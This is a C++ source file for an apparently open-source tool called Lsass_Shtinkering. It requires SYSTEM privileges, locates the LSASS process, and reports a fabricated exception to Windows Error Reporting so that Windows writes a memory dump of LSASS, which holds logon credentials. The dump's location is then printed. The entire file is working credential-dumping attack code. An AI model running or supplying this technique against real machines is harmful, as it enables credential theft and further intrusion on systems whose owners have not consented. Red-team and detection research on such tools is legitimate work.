/*
Copyright (C) 2023 Asaf Gilboa, Ron Ben-Yizhak

This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
*/

#include "Lsass_Shtinkering.h"

int main(int argc, char* argv[])
{

	DWORD processPid;
	HANDLE processHandle;

	try
	{
		if (IsLocalSystem())
			wcout << L"process runs as NT AUTHORITY\\SYSTEM" << endl;
		else
		{
			wcout << L"process must run as NT AUTHORITY\\SYSTEM to dump lsass memory" << endl;
			return 0;
		}
		processPid = GetLsassPid();
		processHandle = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_LIMITED_INFORMATION, TRUE, processPid);

		wcout << L"[*] Reporting exception on LSASS PID: 0x" << std::hex << processPid << endl;
		ReportExceptionToWer(processPid, processHandle);
		wcout << L"[V] Exception reported successfully!" << endl;
		PrintCrashDampLocation();
	}
	catch (std::exception& exception)
	{
		wcout << L"[X] Error: " << exception.what() << endl;
	}
	
}
